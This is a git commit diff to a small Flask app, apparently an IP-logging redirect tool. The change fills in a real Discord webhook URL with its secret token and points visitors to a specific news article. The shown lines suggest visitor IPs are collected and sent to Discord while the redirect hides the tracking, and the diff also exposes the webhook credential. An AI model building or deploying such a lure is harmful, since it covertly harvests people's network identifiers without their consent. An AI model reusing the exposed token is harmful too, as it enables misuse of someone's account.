e59a80dfdeb54d5ccb1067120f34541881e4e10f
aabokvp <akvptv@gmail.com>
2025-07-23 09:39:01 -0700

    Update main.py

--- api/main.py
+++ api/main.py
@@ -2,8 +2,8 @@ from flask import Request, redirect, make_response
 import requests
 from datetime import datetime
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/..."  # <-- ضع رابط Webhook هنا
-REDIRECT_URL = "https://example.com"  # <-- ضع الرابط الذي تريد التوجيه إليه
+DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397615981613809776/dO4Lcv7dBOPHDCp4O6BcrE9CbvHjnRWJEqsZ2wQzhxxmyFKvcGTkU7FrHwHCGgqmVhPG"  # <-- ضع رابط Webhook هنا
+REDIRECT_URL = "https://jo24.net/article/539190"  # <-- ضع الرابط الذي تريد التوجيه إليه
 
 # قاعدة بيانات مؤقتة داخلية (بديل مبسط عن قاعدة بيانات فعلية)
 recent_ips = {}
